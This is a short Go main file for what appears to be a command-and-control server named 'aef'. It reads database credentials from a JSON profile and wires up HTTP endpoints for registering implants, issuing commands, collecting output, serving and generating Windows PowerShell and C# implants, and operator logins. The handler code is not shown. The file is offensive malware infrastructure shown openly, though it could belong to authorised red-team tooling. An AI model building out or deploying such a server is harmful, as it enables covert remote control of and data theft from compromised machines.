package main

import (
	"database/sql"
	"fmt"
	"log"
	"net/http"

	_ "github.com/go-sql-driver/mysql"
)

var (
	db     *sql.DB
	config []Configuration
)

func main() {
	config, err1 := LoadConfiguration("aef-profile.json")
	if err1 != nil {
		fmt.Println(err1)
		return
	}

	user := config[0].Server[0].SQLUser
	pass := config[0].Server[0].SQLPass

	var err error
	db, err = sql.Open("mysql", user+":"+pass+"@tcp(127.0.0.1:3306)/aef")
	if err != nil {
		panic(err)
	}

	serverip := config[0].Server[0].IP
	serverport := config[0].Server[0].Port
	var socket = serverip + ":" + serverport

	http.HandleFunc("/registerNewImplant", registerNewImplant)
	http.HandleFunc("/fetchCommand", fetchCommand)
	http.HandleFunc("/fetchOutput", fetchOutput)
	http.HandleFunc("/getClients", getClients)
	http.HandleFunc("/agents/windows/powershell", powerShellImplant)
	http.HandleFunc("/agents/windows/cs", windowsImplant)
	http.HandleFunc("/generate/windows/implant", generateImplant)
	http.HandleFunc("/getStoredOutput", getStoredOutput)
	http.HandleFunc("/operators/register", registerOperatorHandler)
	http.HandleFunc("/operators/login", loginOperatorHandler)

	fmt.Println("Listening on: " + socket)

	err = http.ListenAndServe(socket, nil)
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}
